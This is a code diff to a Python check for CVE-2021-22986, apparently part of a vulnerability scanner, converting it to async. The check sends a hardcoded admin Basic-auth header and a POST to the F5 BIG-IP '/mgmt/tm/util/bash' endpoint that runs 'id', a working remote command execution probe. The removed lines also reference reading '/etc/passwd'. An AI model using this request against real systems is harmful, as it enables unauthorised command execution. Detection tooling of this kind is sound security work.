@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2021_22986_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class CVE_2021_22986_BaseVerify:
             'Authorization': 'Basic YWRtaW46QVNhc1M='
         }
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -34,18 +34,13 @@ class CVE_2021_22986_BaseVerify:
         
         data = {'command': "run",'utilCmdArgs':"-c id"}
         try:
-            response = request.post(self.url + '/mgmt/tm/util/bash', headers = self.headers, json = data)
-            if response.status_code == 200 and 'commandResult' in response.text:
+            req = await request.post(self.url + '/mgmt/tm/util/bash', headers = self.headers, json = data)
+            if req.status == 200 and 'commandResult' in await req.text():
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
     CVE_2021_22986 = CVE_2021_22986_BaseVerify('https://127.0.0.1:443')
-    # print(CVE_2021_22986.cmd('id'))
-    # print(CVE_2021_22986.read('/etc/passwd'))
